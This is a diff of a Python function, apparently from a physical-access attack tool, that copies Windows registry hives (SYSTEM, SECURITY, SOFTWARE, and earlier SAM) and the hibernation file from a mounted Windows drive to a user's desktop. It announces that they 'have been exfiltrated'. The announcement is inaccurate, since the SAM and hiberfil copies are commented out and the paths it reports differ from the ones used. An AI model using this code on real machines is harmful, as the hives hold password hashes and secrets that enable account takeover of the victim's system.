@@ -70,11 +70,13 @@ def copy_winpayload():
    
     try:
 
-        print(os.listdir('/media/windows/Windows/System32'))
-        shutil.copyfile('/media/windows/Windows/System32/config/SAM', '/home/galactic_t0ast/Desktop/SAM')
-        shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '/home/galactic_t0ast/Desktop/SYSTEM')
-        shutil.copyfile('/media/windows/Windows/System32/config/SECURITY', '/home/galactic_t0ast/Desktop/SECURITY')
-        shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/galactic_t0ast/Desktop/SOFTWARE')
+        print(os.listdir('/media/windows/Windows/System32/config/'))
+        print(os.path.isfile('/media/windows/Windows/System32/config/system'))
+
+        # shutil.copyfile('/media/windows/Windows/System32/config/sam', '/home/galactic_t0ast/Desktop/SAM')
+        shutil.copyfile('/media/windows/Windows/System32/config/system', '/home/galactic_t0ast/Desktop/SYSTEM')
+        shutil.copyfile('/media/windows/Windows/System32/config/security', '/home/galactic_t0ast/Desktop/SECURITY')
+        shutil.copyfile('/media/windows/Windows/System32/config/software', '/home/galactic_t0ast/Desktop/SOFTWARE')
 
         
         #shutil.copyfile('/media/windows/Windows/System32/config/SAM', '/home/zigmo/Desktop/SAM')
@@ -82,7 +84,7 @@ def copy_winpayload():
         #shutil.copyfile('/media/windows/Windows/System32/config/SECURITY', '/home/zigmo/Desktop/SECURITY')
         #shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/zigmo/Desktop/SOFTWARE')
         
-        subprocess.Popen('sudo cp /media/windows/hyberfil.sys /home/galactic_t0ast/Desktop', shell=True)
+        # subprocess.Popen('sudo cp /media/windows/hyberfil.sys /home/galactic_t0ast/Desktop/hyberfil.sys', shell=True)
         print('hybernation file has been exfiltrated to /home/zigmo/Desktop/hyberfil.sys\nSYSTEM SAM SECURITY and SOFTWARE registry hives have been succesfully exfiltrated to /home/zigmo/Desktop')
     except FileNotFoundError as e:
         print(e.strerror) 
